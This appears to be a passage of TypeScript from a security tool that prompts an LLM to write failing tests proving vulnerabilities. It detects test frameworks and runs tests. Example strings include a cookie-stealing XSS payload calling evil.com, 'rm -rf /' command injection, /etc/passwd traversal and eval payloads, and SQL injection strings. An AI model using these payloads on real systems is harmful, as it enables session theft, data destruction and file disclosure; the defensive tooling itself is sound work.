        logger.info(`[RFC-103] Building retry feedback for SyntaxError (attempt ${lastAttempt.attempt})`);
        prompt += buildRetryFeedback(lastAttempt, vulnerability, this.availableTestLibraries);
      } else if (lastError === 'TestPassedUnexpectedly') {
        // Use enhanced feedback with assertion template guidance
        logger.info(`[RFC-103] Building retry feedback for TestPassedUnexpectedly (attempt ${lastAttempt.attempt}, type: ${vulnerability.type || 'unknown'})`);
        prompt += buildRetryFeedback(lastAttempt, vulnerability, this.availableTestLibraries);
        // Also include the concrete inversion examples for additional guidance
        prompt += '\n\nCONCRETE INVERSION EXAMPLES:\n\n' +
          'WRONG (passes on vulnerable code):\n' +
          '  expect(query).to.include(userInput);  // Attack succeeds — user input is in query\n' +
          'RIGHT (fails on vulnerable code):\n' +
          '  expect(query).to.match(/\\$[0-9]|\\?/); // Security check — parameterized placeholders exist (they don\'t)\n\n' +
          'WRONG (passes on vulnerable code):\n' +
          '  expect(output).to.include(maliciousScript);  // Attack succeeds — XSS payload rendered\n' +
          'RIGHT (fails on vulnerable code):\n' +
          '  expect(source).to.match(/escapeHtml|sanitize/); // Security check — sanitization exists (it doesn\'t)\n\n' +
          'WRONG (passes on vulnerable code):\n' +
          '  expect(hash).to.equal(md5(password));  // Attack succeeds — weak hash used\n' +
          'RIGHT (fails on vulnerable code):\n' +
          '  expect(source).to.match(/bcrypt|argon2|scrypt/); // Security check — strong hash exists (it doesn\'t)\n\n' +
          'THE PATTERN: expect(code_or_behavior).to.have(security_property_that_is_missing)';
      } else if (lastError === 'ExistingTestsRegression') {
        prompt += '\n\nIMPORTANT: Don\'t break existing tests. Avoid modifying shared state or setup blocks.';
      } else if (lastError === 'TestExecutionError' &&
                 lastAttempt.errorMessage?.includes('MODULE_NOT_FOUND')) {
        // RFC-103: Use enhanced feedback for missing module errors
        logger.info(`[RFC-103] Building retry feedback for MODULE_NOT_FOUND error (attempt ${lastAttempt.attempt})`);
        prompt += buildRetryFeedback(lastAttempt, vulnerability, this.availableTestLibraries);
        prompt += `\nAlso use path.join(process.cwd(), '${vulnerability.source}') to reference the source file. ` +
          `Do NOT use relative paths like require('../...'). process.cwd() is always the repository root.`;
      } else if (['runtime_error', 'missing_dependency', 'syntax_error'].includes(lastError)) {
        const lastMessage = lastAttempt.errorMessage || '';
        if (lastMessage.includes('Module-level assertions')) {
          // RFC-103: Very specific feedback for the most common failure mode
          prompt += '\n\n## CRITICAL ERROR: YOUR ASSERTIONS RAN OUTSIDE it() BLOCKS\n' +
            'Your test had assertions that executed at module load time, before mocha could discover any tests.\n' +
            'This happens when you put logic INSIDE describe() but OUTSIDE it().\n\n' +
            '**WRONG** (assertions in describe scope — runs at load time):\n' +
            '```\n' +
            "describe('Test', function() {\n" +
            "  const source = fs.readFileSync(file, 'utf8');\n" +
            "  const hasVuln = /pattern/.test(source);\n" +
            "  assert.strictEqual(hasVuln, false, 'Vulnerability found'); // RUNS AT LOAD TIME!\n" +
            "  it('should detect vulnerability', function() { }); // EMPTY!\n" +
            '});\n' +
            '```\n\n' +
            '**CORRECT** (ALL logic inside it() callback):\n' +
            '```\n' +
            "describe('Hardcoded Credentials', function() {\n" +
            "  it('should detect hardcoded secrets in config', function() {\n" +
            "    const source = fs.readFileSync(filePath, 'utf8');\n" +
            "    const hasHardcoded = /['\"]\\w{20,}['\"]/.test(source);\n" +
            "    assert.strictEqual(hasHardcoded, false, 'Hardcoded credential found');\n" +
            '  });\n' +
            '});\n' +
            '```\n\n' +
            'PUT EVERYTHING — file reads, regex checks, AND assertions — INSIDE the it() function body.';
        } else if (lastMessage.includes('No tests found')) {
          prompt += '\n\nPREVIOUS ATTEMPT FAILED: The test file contained no test cases. ' +
            'Ensure the file has describe()/it() blocks (for mocha) or test() blocks. ' +
            'ALL logic (file reads, variable assignments, assertions) MUST be inside the it() callback, not at module scope or describe scope.';
        } else if (lastMessage.includes('cannot load such file') || lastMessage.includes('LoadError')) {
          prompt += `\n\nPREVIOUS ATTEMPT FAILED: ${lastMessage}. ` +
            'DO NOT require rails_helper, spec_helper, or application-specific helpers. ' +
            'Write a STANDALONE test that only requires rspec and the vulnerable source file directly. ' +
            'Use require_relative or explicit paths. The test must run without Rails booting.';
        } else if (lastMessage.includes('Cannot find module') || lastMessage.includes('No module named')) {
          // RFC-103: Use enhanced feedback for missing dependency errors
          logger.info(`[RFC-103] Building retry feedback for missing dependency (attempt ${lastAttempt.attempt}): ${lastMessage.slice(0, 100)}`);
          prompt += buildRetryFeedback(lastAttempt, vulnerability, this.availableTestLibraries);
        } else {
          prompt += `\n\nPREVIOUS ATTEMPT FAILED: ${lastError} — ${lastMessage}. ` +
            'Fix the error and ensure tests can run to completion.';
        }
      }
    }

    return prompt;
  }

  /**
   * RFC-103: Get assertion template section for the prompt
   * Returns a formatted section with specific assertion guidance for the vulnerability type.
   */
  private getAssertionTemplateSection(vulnerability: Vulnerability, framework: TestFramework): string {
    // Extract CWE ID from vulnerability - try cweId, cwe_id, or parse from type
    const cweId = vulnerability.cweId ||
      vulnerability.cwe_id ||
      this.extractCweFromType(vulnerability.type);

    if (!cweId) {
      logger.debug(`[RFC-103] No CWE ID found for vulnerability type: ${vulnerability.type || 'unknown'}`);
      return '';
    }

    const template = getAssertionTemplateForFramework(cweId, framework.name.toLowerCase());
    if (!template) {
      logger.debug(`[RFC-103] No assertion template found for CWE: ${cweId}, framework: ${framework.name}`);
      return '';
    }

    logger.info(`[RFC-103] Using assertion template for ${cweId} (${template.name}) with framework: ${framework.name}`);

    return `
## ASSERTION STRATEGY FOR ${template.name} (${cweId})
Goal: ${template.assertionGoal}
Attack payload to use: ${template.attackPayload}
Strategy: ${template.testStrategy}

**CRITICAL: Test Structure Requirement**
Your test MUST use proper ${framework.name} test structure with describe() and it() blocks.
All assertions MUST be inside it() callbacks, NOT at module load time.
Tests that run assertions outside it() blocks will be rejected.

Framework hint (${framework.name}): ${template.frameworkHint}

`;
  }

  /**
   * Extract CWE ID from vulnerability type string if not explicitly provided.
   */
  private extractCweFromType(vulnType: string): string | undefined {
    const typeToId: Record<string, string> = {
      'sql_injection': 'CWE-89',
      'sql injection': 'CWE-89',
      'xss': 'CWE-79',
      'cross-site scripting': 'CWE-79',
      'cross_site_scripting': 'CWE-79',
      'path_traversal': 'CWE-22',
      'path traversal': 'CWE-22',
      'directory_traversal': 'CWE-22',
      'command_injection': 'CWE-78',
      'command injection': 'CWE-78',
      'os_command_injection': 'CWE-78',
      'deserialization': 'CWE-502',
      'insecure_deserialization': 'CWE-502',
      'hardcoded_credentials': 'CWE-798',
      'hardcoded_secrets': 'CWE-798',
      'hardcoded credentials': 'CWE-798',
      'code_injection': 'CWE-94',
      'code injection': 'CWE-94',
      'eval_injection': 'CWE-94',
    };

    const normalized = vulnType.toLowerCase().trim();
    return typeToId[normalized];
  }

  /**
   * RFC-103: Get assertion style guidance section for the LLM prompt.
   * Tells the LLM which assertion library/style to use based on what's available.
   */
  private getAssertionStyleSection(framework: TestFramework): string {
    // Determine ecosystem from framework or project shape
    let ecosystem = this.getEcosystemFromFramework(framework);

    // Get assertion style guidance based on available libraries
    const guidance = getAssertionStyleGuidance(ecosystem, this.availableTestLibraries);

    logger.info(`[RFC-103] Assertion style guidance: ${guidance.style} style with ${guidance.preferredLibrary}`);

    let section = `
## ASSERTION STYLE GUIDANCE
Style: ${guidance.style} (${guidance.preferredLibrary})
Import: ${guidance.importStatement || 'No import needed - globals are auto-available'}
Example syntax:
${guidance.syntaxExample}
`;

    // Add "do not use" warnings if there are unavailable libraries
    if (guidance.doNotUse.length > 0) {
      section += `
DO NOT USE these libraries (not installed): ${guidance.doNotUse.slice(0, 5).join(', ')}${guidance.doNotUse.length > 5 ? '...' : ''}
`;
    }

    // Add version warning for Node assert
    if (guidance.versionWarning) {
      section += `
WARNING: ${guidance.versionWarning}
`;
    }

    return section;
  }

  /**
   * Map test framework to ecosystem name.
   */
  private getEcosystemFromFramework(framework: TestFramework): string {
    const frameworkToEcosystem: Record<string, string> = {
      jest: 'javascript',
      vitest: 'javascript',
      mocha: 'javascript',
      jasmine: 'javascript',
      tap: 'javascript',
      ava: 'javascript',
      bun: 'javascript',
      pytest: 'python',
      unittest: 'python',
      rspec: 'ruby',
      minitest: 'ruby',
      exunit: 'elixir',
      phpunit: 'php',
      pest: 'php',
      junit: 'java',
      testng: 'java',
      go_test: 'go',
      testing: 'go',
    };

    // Try exact match first
    const ecosystemFromFramework = frameworkToEcosystem[framework.name.toLowerCase()];
    if (ecosystemFromFramework) {
      return ecosystemFromFramework;
    }

    // Use project ecosystem if available
    if (this.projectEcosystems.length > 0) {
      return this.projectEcosystems[0];
    }

    return 'javascript'; // Default fallback
  }

  /**
   * Get realistic vulnerability examples from Phase 0 documentation
   */
  private getRealisticVulnerabilityExample(vulnerabilityType: string): string {
    // Map to examples from REALISTIC-VULNERABILITY-EXAMPLES.md
    const examples: Record<string, string> = {
      'sql_injection': `REAL-WORLD EXAMPLE (RailsGoat):
Pattern: User.where("id = '\#{params[:user][:id]}'")
Attack: 5') OR admin = 't' --'
Impact: Privilege escalation to admin
CWE: CWE-89`,

      'nosql_injection': `REAL-WORLD EXAMPLE (NodeGoat):
Pattern: db.accounts.find({username: username, password: password})
Attack: {"username": "admin", "password": {"$gt": ""}}
Impact: Authentication bypass
CWE: CWE-943`,

      'xss': `REAL-WORLD EXAMPLE (NodeGoat):
Pattern: res.send(\`<h1>Profile: \${user.name}</h1>\`)
Attack: <script>document.location='http://evil.com/steal?cookie='+document.cookie</script>
Impact: Session hijacking
CWE: CWE-79`,

      'command_injection': `REAL-WORLD EXAMPLE:
Pattern: exec(\`tar -czf backup.tar.gz \${filename}\`)
Attack: data.txt; rm -rf / #
Impact: System compromise
CWE: CWE-78`,

      'path_traversal': `REAL-WORLD EXAMPLE:
Pattern: res.sendFile(\`/app/uploads/\${filename}\`)
Attack: ../../../etc/passwd
Impact: Read sensitive files
CWE: CWE-22`,

      'code_injection': `REAL-WORLD EXAMPLE (NodeGoat):
Pattern: const preTax = eval(req.body.preTax);
Attack: require('child_process').execSync('cat /etc/passwd')
Impact: Remote code execution via eval() of user input
CWE: CWE-94`,

      'hardcoded_secrets': `REAL-WORLD EXAMPLE:
Pattern: zapApiKey: "v9dn0balpqas1pcc281tn5ood1"
Attack: Searching source code or git history for API keys
Impact: Unauthorized API access
CWE: CWE-798`
    };

    return examples[vulnerabilityType.toLowerCase()] || `Vulnerability type: ${vulnerabilityType}`;
  }

  /**
   * Two-phase inversion: When a test passes unexpectedly, make a focused LLM call
   * asking specifically to INVERT the assertion.
   *
   * This gives the LLM a concrete transformation task rather than an abstract
   * conceptual task about RED tests.
   */
  private async invertPassingTest(
    passingTestCode: string,
    testOutput: string,
    vulnerability: Vulnerability,
    framework: TestFramework
  ): Promise<string | null> {
    const langHint = framework.name === 'rspec' ? 'ruby' :
      ['mocha', 'jest', 'vitest'].includes(framework.name) ? 'javascript' : framework.name;

    const prompt = `Your test PASSED but it needs to FAIL on vulnerable code.

HERE IS YOUR TEST THAT PASSED:
\`\`\`${langHint}
${passingTestCode}
\`\`\`

TEST OUTPUT (showing it PASSED):
\`\`\`
${testOutput.slice(-800)}
\`\`\`

THE PROBLEM:
Your test checks if the ATTACK SUCCEEDS — and it does, so the test passes.
But we need a RED test that FAILS on vulnerable code.

YOUR TASK:
INVERT the assertion. Instead of checking if the attack works, check if SECURITY CONTROLS EXIST.
Since the code is vulnerable (no security controls), this inverted assertion will FAIL.

INVERSION EXAMPLES:

Original (PASSES on vulnerable code):
  expect(query).to.include(userInput);  // Attack succeeds
Inverted (FAILS on vulnerable code):
  expect(source).to.match(/\\$[0-9]|\\?/);  // Checks for parameterized placeholders — they don't exist

Original (PASSES on vulnerable code):
  expect(output).to.include('<script>');  // XSS payload rendered
Inverted (FAILS on vulnerable code):
  expect(source).to.match(/escapeHtml|sanitize/);  // Checks for sanitization — it doesn't exist

Original (PASSES on vulnerable code):
  expect(hash).to.equal(md5(password));  // Weak hash used
Inverted (FAILS on vulnerable code):
  expect(source).to.match(/bcrypt|argon2|scrypt/);  // Checks for strong hash — it doesn't exist

THE PATTERN:
- Your test checks: "Does the attack work?" → YES → PASS
- Inverted test checks: "Does the security control exist?" → NO → FAIL

VULNERABILITY CONTEXT:
Type: ${vulnerability.type}
Location: ${vulnerability.location}

Return ONLY the inverted test file. No explanation, just the code block:

\`\`\`${langHint}
// Your inverted test here
\`\`\``;

    try {
      logger.info('[Two-Phase] Attempting inversion of passing test...');
      const aiClient = await getAiClient(this.config.aiProvider);
      const response = await aiClient.complete(prompt, {
        temperature: 0.2,
        maxTokens: this.config.aiProvider.maxTokens,
        model: this.config.aiProvider.model,
        // Extended thinking for better reasoning about inversion
        thinking: {
          type: 'enabled',
          budget_tokens: 8000
        }
      });

      // Extract code block from response
      const codeMatch = response.match(/```(?:javascript|typescript|ruby|python|js|ts|rb|py|rspec)?\s*\n([\s\S]*?)```/);
      if (codeMatch && codeMatch[1]?.trim()) {
        logger.info('[Two-Phase] Successfully generated inverted test');
        return codeMatch[1].trim();
      }

      logger.warn('[Two-Phase] Failed to extract code block from inversion response');
      return null;
    } catch (error) {
      logger.error('[Two-Phase] Inversion call failed:', error);
      return null;
    }
  }

  /**
   * Map framework name (from backend detection) to TestFramework object.
   * Central registry — avoids re-detecting framework from file path.
   */
  private frameworkFromName(name: string): TestFramework {
    const frameworks: Record<string, TestFramework> = {
      'mocha':   { name: 'mocha',   testCommand: 'npx mocha',          syntaxCheckCommand: 'node --check' },
      'jest':    { name: 'jest',    testCommand: 'npx jest',            syntaxCheckCommand: 'node --check' },
      'vitest':  { name: 'vitest',  testCommand: 'npx vitest run',     syntaxCheckCommand: 'node --check' },
      'rspec':   { name: 'rspec',   testCommand: 'bundle exec rspec',  syntaxCheckCommand: 'ruby -c' },
      'pytest':  { name: 'pytest',  testCommand: 'python3 -m pytest',  syntaxCheckCommand: 'python3 -m py_compile' },
      'phpunit': { name: 'phpunit', testCommand: 'vendor/bin/phpunit', syntaxCheckCommand: 'php -l' },
      'exunit':  { name: 'exunit',  testCommand: 'mix test',           syntaxCheckCommand: '' }, // Elixir: syntax check via mix test
      'minitest': { name: 'minitest', testCommand: 'ruby -Itest',     syntaxCheckCommand: 'ruby -c' },
      'junit5':  { name: 'junit5',  testCommand: 'mvn test -Dtest=',  syntaxCheckCommand: '' }, // Java: syntax check via mvn compile
      'cypress':    { name: 'cypress',    testCommand: 'npx cypress run --spec', syntaxCheckCommand: 'node --check' },
      'playwright': { name: 'playwright', testCommand: 'npx playwright test',    syntaxCheckCommand: 'node --check' },
    };
    return frameworks[name.toLowerCase()] || this.detectFrameworkFromPath(name);
  }

  /**
   * Detect framework from test file path (fallback when name not in registry)
   */
  private detectFrameworkFromPath(testPath: string): TestFramework {
    const fileName = path.basename(testPath);
    const ext = path.extname(testPath);

    // Detect by file naming conventions
    if (fileName.includes('.spec.')) {
      if (ext === '.rb') return { name: 'rspec', syntaxCheckCommand: 'ruby -c', testCommand: 'bundle exec rspec' };
      if (ext === '.ts' || ext === '.js') return { name: 'jest', syntaxCheckCommand: 'node --check', testCommand: 'npm test' };
    }

    if (fileName.includes('.test.')) {
      if (ext === '.ts' || ext === '.js') return { name: 'vitest', syntaxCheckCommand: 'node --check', testCommand: 'npm test' };
      if (ext === '.php') return { name: 'phpunit', syntaxCheckCommand: 'php -l', testCommand: 'vendor/bin/phpunit' };
    }

    if (ext === '.py') return { name: 'pytest', syntaxCheckCommand: 'python3 -m py_compile', testCommand: 'python3 -m pytest' };
    if (ext === '.rb') return { name: 'rspec', syntaxCheckCommand: 'ruby -c', testCommand: 'bundle exec rspec' };
    if (ext === '.java') return { name: 'junit5', syntaxCheckCommand: '', testCommand: 'mvn test' }; // Java: syntax check via mvn compile
    if (ext === '.ex' || ext === '.exs') return { name: 'exunit', syntaxCheckCommand: '', testCommand: 'mix test' }; // Elixir: syntax check via mix test

    // Default to generic
    return { name: 'generic', syntaxCheckCommand: 'echo "No syntax check"', testCommand: 'echo "No test runner"' };
  }

  /**
   * Detect test framework from file content using import/require patterns.
   * RFC-034: Per-file framework detection based on import/require analysis.
   * Returns null for unrecognized content (falls back to project-level detection).
   */
  private detectFrameworkFromContent(content: string): string | null {
    // Cypress (check before mocha — Cypress tests also use describe/it)
    if (/\bcy\.(get|visit|request|contains|intercept|wait)\b/.test(content) ||
        /\bCypress\.(Commands|env|config)\b/.test(content) ||
        /\/\/\/\s*<reference\s+types="Cypress"\s*\/>/.test(content)) {
      return 'cypress';
    }
    // Playwright
    if (/from\s+['"]@playwright\/test['"]/.test(content) ||
        /require\s*\(\s*['"]@playwright\/test['"]\s*\)/.test(content)) {
      return 'playwright';
    }
    // Selenium
    if (/from\s+selenium\s+import/.test(content) ||
        /require\s*\(\s*['"]selenium-webdriver['"]\s*\)/.test(content)) {
      return 'selenium';
    }
    // Vitest (before jest — similar syntax)
    if (/from\s+['"]vitest['"]/.test(content) ||
        /import\s*\{[^}]*\}\s*from\s*['"]vitest['"]/.test(content)) {
      return 'vitest';
    }
    // Jest / Testing Library
    if (/from\s+['"]@testing-library\//.test(content) ||
        /require\s*\(\s*['"]@testing-library\//.test(content)) {
      return 'jest';
    }
    // Mocha (chai without cy.)
    if ((/require\s*\(\s*['"]chai['"]\s*\)/.test(content) ||
         /from\s+['"]chai['"]/.test(content)) &&
        !/\bcy\./.test(content)) {
      return 'mocha';
    }
    return null;
  }

  /**
   * Check if a framework is an E2E framework that can't validate in isolation.
   * E2E frameworks require a running app server and can't be used for unit-level validation.
   */
  private isE2EFramework(framework: string): boolean {
    const e2eFrameworks = new Set([
      'cypress', 'playwright', 'selenium', 'webdriver', 'puppeteer', 'nightwatch'
    ]);
    return e2eFrameworks.has(framework.toLowerCase());
  }

  /**
   * Get file extension for language
   */
  private getLanguageExtension(frameworkName: string): string {
    const extensions: Record<string, string> = {
      'rspec': '.rb',
      'minitest': '.rb',
      'pytest': '.py',
      'phpunit': '.php',
      'pest': '.php',
      'jest': '.js',
      'vitest': '.ts',
      'mocha': '.js',
      'junit5': '.java',
      'testng': '.java',
      'exunit': '.exs'
    };

    return extensions[frameworkName.toLowerCase()] || '.js';
  }

  /**
   * Check if a command-line tool is available on the system PATH.
   * Extracts the base tool name from a command string and uses `which` to verify.
   */
  private checkToolAvailable(tool: string): boolean {
    try {
      // Explicitly pass process.env to ensure PATH updates from ensureRuntime() are visible
      const result = execSync(`which ${tool}`, { encoding: 'utf8', stdio: 'pipe', env: process.env });
      logger.debug(`Tool '${tool}' found at: ${result.trim()}`);
      return true;
    } catch {
      logger.debug(`Tool '${tool}' not found. PATH: ${process.env.PATH?.substring(0, 200)}`);
      return false;
    }
  }

  /**
   * Extract the base tool name from a command string.
   * e.g., "npx mocha" → "npx", "bundle exec rspec" → "bundle", "node --check" → "node"
   */
  private getBaseToolFromCommand(command: string): string {
    return command.split(/\s+/)[0];
  }

  /**
   * Validate syntax of test file
   */
  private async validateSyntax(testFile: string, framework: TestFramework): Promise<void> {
    if (!framework.syntaxCheckCommand) {
      logger.debug('No syntax check command available');
      return;
    }

    const baseTool = this.getBaseToolFromCommand(framework.syntaxCheckCommand);
    if (!this.checkToolAvailable(baseTool)) {
      throw new Error(
        `Syntax check tool '${baseTool}' is not installed or not available on PATH. ` +
        `Framework '${framework.name}' requires '${baseTool}' for syntax validation.`
      );
    }

    try {
      const command = `${framework.syntaxCheckCommand} ${testFile}`;
      execSync(command, { cwd: this.repoPath, encoding: 'utf8', env: process.env });
    } catch (error: unknown) {
      const message = error instanceof Error ? error.message : String(error);
      throw new Error(`Syntax validation failed: ${message}`);
    }
  }

  /**
   * Validate that the test file has proper test framework structure.
   * This catches cases where the LLM generates assertions at module load time
   * instead of inside describe/it blocks, which causes "no tests found" errors.
   */
  private validateTestStructure(testFile: string, framework: TestFramework): void {
    const content = fs.readFileSync(testFile, 'utf8');

    // Define required patterns for each framework
    const structurePatterns: Record<string, { patterns: RegExp[]; description: string }> = {
      mocha: {
        patterns: [
          /describe\s*\(\s*['"`]/,  // describe('...')
          /it\s*\(\s*['"`]/,         // it('...')
        ],
        description: "describe('...', function() { it('...', function() { /* assertions */ }); });"
      },
      jest: {
        patterns: [
          /describe\s*\(\s*['"`]/,
          /(it|test)\s*\(\s*['"`]/,
        ],
        description: "describe('...', () => { it('...', () => { /* assertions */ }); });"
      },
      vitest: {
        patterns: [
          /describe\s*\(\s*['"`]/,
          /(it|test)\s*\(\s*['"`]/,
        ],
        description: "describe('...', () => { it('...', () => { /* assertions */ }); });"
      },
      pytest: {
        patterns: [
          /def\s+test_\w+\s*\(/,  // def test_something():
        ],
        description: "def test_vulnerability():\n    assert condition, 'message'"
      },
      rspec: {
        patterns: [
          /describe\s+['"`\w]/,
          /it\s+['"`]/,
        ],
        description: "describe 'Subject' do\n  it 'tests something' do\n    expect(...).to ...\n  end\nend"
      },
      exunit: {
        patterns: [
          /describe\s+['"`]/,
          /test\s+['"`]/,
        ],
        description: 'describe "Subject" do\n  test "tests something" do\n    assert ...\n  end\nend'
      },
      phpunit: {
        patterns: [
          /class\s+\w+.*extends.*TestCase/,
          /function\s+test\w+\s*\(/,
        ],
        description: "class MyTest extends TestCase {\n  public function testSomething() { ... }\n}"
      },
      junit: {
        patterns: [
          /@Test/,
          /void\s+test\w*\s*\(/,
        ],
        description: "@Test\npublic void testSomething() { ... }"
      },
    };

    const frameworkKey = framework.name.toLowerCase();
    const structureReq = structurePatterns[frameworkKey];

    if (!structureReq) {
      // Unknown framework, skip structural validation
      logger.debug(`No structural validation rules for framework: ${framework.name}`);
      return;
    }

    // Check if all required patterns are present
    const missingPatterns: string[] = [];
    for (const pattern of structureReq.patterns) {
      if (!pattern.test(content)) {
        missingPatterns.push(pattern.source);
      }
    }

    if (missingPatterns.length > 0) {
      let errorMsg = `Test file lacks proper ${framework.name} structure.\n`;
      errorMsg += `Missing patterns: ${missingPatterns.join(', ')}\n`;
      errorMsg += `Expected structure:\n${structureReq.description}\n`;

      throw new Error(errorMsg);
    }

    // CRITICAL: For JS-based frameworks, verify assertions are inside it() blocks
    // This catches cases where the LLM writes assertions in describe scope or at module level
    if (['mocha', 'jest', 'vitest'].includes(frameworkKey)) {
      const hasModuleLevelAsserts = this.hasModuleLevelAssertions(content, frameworkKey);
      if (hasModuleLevelAsserts) {
        let errorMsg = `Test file has ASSERTIONS OUTSIDE it() callbacks.\n`;
        errorMsg += `Assertions in describe() scope or at module level run at load time, not during test execution.\n`;
        errorMsg += `CRITICAL: Move ALL logic (file reads, variable assignments, AND assertions) INSIDE the it() callback function.`;

        throw new Error(errorMsg);
      }
    }

    logger.debug(`Test structure validation passed for ${framework.name}`);
  }

  /**
   * Check if the test file has assertions at module level (outside test callbacks)
   * This is a more sophisticated check that looks for assertions outside of it() blocks.
   */
  private hasModuleLevelAssertions(content: string, framework: string): boolean {
    // Only check JS-based frameworks that use describe/it
    if (!['mocha', 'jest', 'vitest'].includes(framework)) return false;

    // Common assertion patterns
    const assertionPatterns = [
      /assert\s*\.\s*\w+\s*\(/g,  // assert.strictEqual(...), assert.ok(...)
      /assert\s*\([^)]+\)/g,       // assert(...)
      /expect\s*\([^)]+\)/g,       // expect(...)
      /\.should\.\w+/g,            // value.should.equal
    ];

    // Find all assertions in the file
    const assertions: Array<{ match: string; index: number }> = [];
    for (const pattern of assertionPatterns) {
      let match;
      const regex = new RegExp(pattern.source, 'g');
      while ((match = regex.exec(content)) !== null) {
        assertions.push({ match: match[0], index: match.index });
      }
    }

    if (assertions.length === 0) return false;

    // Find all it() block ranges (simplified: find it() and look for corresponding closing brace)
    // Use a relaxed regex that matches it('...', function() { or it('...', () => { or variations
    const itBlockStarts = Array.from(content.matchAll(/it\s*\(\s*['"`][^'"`]+['"`]\s*,\s*(?:async\s+)?(?:function\s*\([^)]*\)|\([^)]*\)\s*=>)\s*\{/g))
      .map(m => m.index!);

    if (itBlockStarts.length === 0) return true; // Has assertions but no it blocks

    // Check each assertion to see if it's inside an it() block
    for (const assertion of assertions) {
      let isInsideItBlock = false;

      for (const itStart of itBlockStarts) {
        if (assertion.index > itStart) {
          // Find the end of this it() block by counting braces
          const blockContent = content.slice(itStart);
          let braceCount = 0;
          let blockEnd = itStart;
          let foundStart = false;

          for (let i = 0; i < blockContent.length; i++) {
            if (blockContent[i] === '{') {
              braceCount++;
              foundStart = true;
            } else if (blockContent[i] === '}') {
              braceCount--;
              if (foundStart && braceCount === 0) {
                blockEnd = itStart + i;
                break;
              }
            }
          }

          if (assertion.index >= itStart && assertion.index < blockEnd) {
            isInsideItBlock = true;
            break;
          }
        }
      }

      // If any assertion is outside all it() blocks, return true
      if (!isInsideItBlock) {
        logger.debug(`Module-level assertion found: "${assertion.match}" at index ${assertion.index}`);
        return true;
      }
    }

    return false;
  }

  /**
   * Build a test name filter flag for the given framework.
   * Returns empty string if no testName is provided.
   * This ensures only the newly generated test runs, not existing tests in the file.
   */
  private buildTestNameFilter(framework: TestFramework, testName?: string): string {
    if (!testName) return '';

    // Framework-specific flags for filtering by test name
    const nameFilterFlags: Record<string, string> = {
      'jest': '--testNamePattern',
      'vitest': '-t',
      'mocha': '--grep',
      'rspec': '-e',
      'pytest': '-k',
      'minitest': '-n',
      'phpunit': '--filter',
      'exunit': '--only',
    };

    const flag = nameFilterFlags[framework.name];
    if (!flag) return '';

    // Escape the test name for shell use
    const escapedName = testName.replace(/"/g, '\\"');
    return ` ${flag} "${escapedName}"`;
  }

  /**
   * Run test and check results
   */
  private async runTest(testFile: string, framework: TestFramework, testName?: string): Promise<{
    passed: boolean;
    existingTestsFailed: boolean;
    failedTests?: string[];
    output: string;
    stderr: string;
    exitCode: number;
  }> {
    if (!framework.testCommand) {
      logger.warn('No test command available, skipping test execution');
      return { passed: false, existingTestsFailed: false, output: '', stderr: '', exitCode: 1 };
    }

    const baseTool = this.getBaseToolFromCommand(framework.testCommand);
    if (!this.checkToolAvailable(baseTool)) {
      logger.warn(
        `Test runner tool '${baseTool}' is not installed or not available on PATH. ` +
        `Framework '${framework.name}' requires '${baseTool}' for test execution. Skipping test run.`
      );
      return { passed: false, existingTestsFailed: false, output: '', stderr: '', exitCode: 1 };
    }

    try {
      // Don't use test name filter - we write a single test per file, and the filter
      // often doesn't match because the LLM names tests differently than our testName
      let command: string;

      // RFC-101 v3.8.69: Maven/JUnit expects class name, not file path
      // e.g., "mvn test -Dtest=MyTest" not "mvn test /path/to/MyTest.java"
      if (framework.testCommand.startsWith('mvn ')) {
        // Extract class name from file path: /path/to/MyTest.java -> MyTest
        const fileName = path.basename(testFile);
        const className = fileName.replace(/\.java$/, '');
        // Check if testCommand already ends with -Dtest= (from frameworkFromName)
        if (framework.testCommand.includes('-Dtest=')) {
          command = `${framework.testCommand}${className}`;
        } else {
          command = `${framework.testCommand} -Dtest=${className}`;
        }
      } else {
        command = `${framework.testCommand} ${testFile}`;
      }

      logger.info(`Running test command: ${command}`);
      const output = execSync(command, { cwd: this.repoPath, encoding: 'utf8', env: process.env });

      // Exit code 0 means the test runner reported all tests passed.
      // But we need to detect "0 examples" / "0 tests" which is NOT a valid pass
      const zeroTestsPattern = /0 examples|0 tests|no tests|All examples were filtered out/i;
      if (zeroTestsPattern.test(output)) {
        logger.warn(`Test ran 0 tests (filter mismatch or empty file) - treating as failure`);
        return {
          passed: false,
          existingTestsFailed: false,
          output,
          stderr: '',
          exitCode: 0
        };
      }

      return {
        passed: true,
        existingTestsFailed: false,
        output,
        stderr: '',
        exitCode: 0
      };
    } catch (error: any) {
      // Test failed (which is good for RED tests!)
      const output = error.stdout || error.message || '';
      const stderr = error.stderr || '';
      const exitCode = error.status || 1;

      // RFC-101 v3.8.70: For RED test generation, we don't check for "existing tests regression"
      // because the entire test file is generated by us. The regression check only makes sense
      // for GREEN/REFACTOR phases where we're modifying existing code.
      // The previous heuristic (counting "failed" word occurrences) was too aggressive and
      // caused false positives, especially with pytest which outputs "1 failed" + "FAILED test::name".

      return {
        passed: false,
        existingTestsFailed: false, // Always false for RED test generation
        failedTests: undefined,
        output,
        stderr,
        exitCode
      };
    }
  }

  /**
   * Extract failed test names from test output
   */
  private extractFailedTestNames(output: string): string[] {
    const failedTests: string[] = [];

    // Common patterns for failed test output
    const patterns = [
      /FAIL\s+(.+)/g,
      /✗\s+(.+)/g,
      /Failed:\s+(.+)/g,
      /\d+\)\s+(.+)/g
    ];

    for (const pattern of patterns) {
      const matches = output.matchAll(pattern);
      for (const match of matches) {
        if (match[1]) {
          failedTests.push(match[1].trim());
        }
      }
    }

    return failedTests.slice(0, 5); // Return first 5 for brevity
  }

  /**
   * Tag issue as "not-validated" after retry exhaustion
   */
  private async tagIssueNotValidated(
    vulnerability: Vulnerability,
    previousAttempts: AttemptHistory[]
  ): Promise<void> {
    // This would need an issue number, which we don't have in the current flow
    // For now, log the failure
    logger.error(`Failed to validate vulnerability after ${previousAttempts.length} attempts`);
    logger.error(`Vulnerability: ${vulnerability.type} at ${vulnerability.location}`);
    logger.error('Attempt history:');
    for (const attempt of previousAttempts) {
      logger.error(`  - Attempt ${attempt.attempt}: ${attempt.error} - ${attempt.errorMessage}`);
    }

    // In a real implementation, this would:
    // 1. Find or create a GitHub issue for this vulnerability
    // 2. Add "not-validated" label
    // 3. Add comment with attempt history
  }

  /**
   * Scan repository for test files
   * RFC-060-AMENDMENT-001: Comprehensive pattern coverage for all supported languages
   */
  private async scanTestFiles(framework?: string): Promise<string[]> {
    const testFiles: string[] = [];

    // Use shared constants for pattern matching and directory exclusion
    const excludeDirs = EXCLUDED_DIRECTORIES;
    const testPatterns = TEST_FILE_PATTERNS;

    /**
     * Recursively scan directory for test files using Node.js fs module.
